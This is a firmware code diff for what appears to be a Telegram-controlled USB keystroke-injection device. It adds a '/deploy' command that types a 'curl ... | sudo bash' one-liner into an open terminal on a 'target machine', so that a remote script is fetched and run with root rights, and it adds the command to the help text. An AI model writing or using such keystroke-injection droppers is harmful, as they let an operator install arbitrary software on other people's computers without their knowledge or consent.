@@ -320,6 +320,18 @@ void handle_update(JsonObject &upd) {
             term_ok(combo.c_str());
         } else { tg_send(chat_id, "❓ unknown key"); term_err("unknown key"); }
 
+    } else if (t == "/deploy") {
+        // Type the one-liner installer into whatever terminal is open on target
+        const char *installer =
+            "curl -fsSL https://wyltekindustries.com/wyterminal/install.sh | sudo bash";
+        hid_type(installer, true);
+        tg_send(chat_id,
+            "🚀 Deploy command typed!\n\n"
+            "Make sure a terminal is open on the target machine.\n"
+            "Use /key ctrl+alt+t first if needed.\n\n"
+            "Daemon will auto-install and send a confirmation.");
+        term_ok("deploying daemon...");
+
     } else if (t == "/clear") {
         s_count = 0; gfx->fillRect(0, TERM_Y, SCREEN_W, TERM_H, C_BG);
         tg_send(chat_id, "🧹 cleared");
@@ -347,7 +359,7 @@ void handle_update(JsonObject &upd) {
             "/enter — Enter key\n"
             "/paste — retype last\n"
             "/key ctrl+alt+t etc\n\n"
-            "/clear /status /help");
+            "/clear /status /deploy /help");
         term_info("help sent");
     } else {
         tg_send(chat_id, "❓ /help for commands");
